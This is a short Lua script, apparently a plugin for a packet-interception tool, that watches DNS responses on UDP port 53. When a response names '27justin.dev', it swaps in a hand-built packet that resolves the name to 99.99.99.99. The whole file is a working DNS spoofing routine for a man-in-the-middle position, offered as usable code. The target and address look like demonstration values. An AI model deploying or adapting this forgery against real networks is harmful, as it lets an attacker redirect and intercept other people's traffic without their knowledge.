function mock_dns_response(original_payload)
	-- Following is a raw DNS response packet.
	-- The first two bytes are exchanged with the original type as they are the response ID
	local response = { original_payload:get(0), original_payload:get(1), 0x81, 0x80, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x32, 0x37, 0x6a, 0x75, 0x73, 0x74, 0x69, 0x6e, 0x03, 0x64, 0x65, 0x76, 0x00, 0x00, 0x01, 0x00, 0x01, 0xc0, 0x0c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x51, 0x80, 0x00, 0x04,--[[ The following 4 bytes (0x63,...) are the new IP address, in decimal this corresponds to 99.99.99.99 ]] 0x63, 0x63, 0x63, 0x63, 0x00, 0x00, 0x29, 0x04, 0xd0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }
	return binary(response)
end

function on_packet(eth_frame)
	local ipv4 = eth_frame:ipv4()
	if ipv4 == nil then
		return
	end
	local udp = ipv4:udp()
	if udp == nil then
		return
	end

	-- Only check for DNS server responses
	if udp:src_port() == 53 then
		local payload = udp:payload()
		-- Only change the response if it contains some predetermined hostname
		if payload:contains(binary("27justin")) then
			print("Exchanging DNS response")
			local response = mock_dns_response(payload)
			udp:payload(response)
			ipv4:payload(udp)
			eth_frame:payload(ipv4)
		end
		return eth_frame
	end
end

